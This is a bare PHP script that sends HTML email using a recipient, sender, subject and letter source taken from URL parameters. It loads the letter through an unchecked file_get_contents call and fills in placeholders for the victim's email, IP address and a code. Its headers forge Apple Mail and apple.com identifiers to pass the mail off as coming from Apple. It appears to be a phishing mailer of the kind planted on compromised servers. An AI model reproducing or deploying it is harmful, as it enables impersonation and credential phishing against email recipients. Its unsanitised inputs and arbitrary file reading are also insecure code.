<?php
$code = $_GET["code"];
$ip = $_GET["ip"];
$to      = $_GET["to"];
$subject = $_GET["subject"];
$message = $_GET["letter"];
$name	= $_GET["name"];
$from = $_GET["from"];
$letter = file_get_contents($message);
$keymail = "!email!";
$keyip = "!ip!";
$keycode = "!code!";
$letter1 = str_replace("$keymail", "$to", $letter);
$letter2 = str_replace("$keyip", " $ip", $letter1);
$letter3 = str_replace("$keycode", "$code", $letter2);
$header = "MIME-Version: 1.0\n";
$header .= "Content-type: text/html; CP-1252 \n";
$header .= "From: ".$name . " <" . $from . ">\n";
$header .= "Reply-To: " . $from . "\n";
$header .= "X-Priority: 3\n";
$header .= "X-MSMail-Priority: Normal\n";
$header .= "User-Agent: Apple Mail \n";
$header .= "X-Mailer: Apple Mail";
$header .= "List-Unsubscribe: <mailto:unsubscribe-espc-tech-12345N@apple.com>, <http://apple.com/member/unsubscribe/?listname=espc-tech@apple.com?id=". $to .">";
$header .= "Message-ID: 38D1C1FD-3C35-4568-925C-FC46CAC0DE8A@apple.com";
 

if(@mail($to, $subject, $letter3, $header))
   {
     echo "ok";
   }else{
     echo "fail";
   }
?>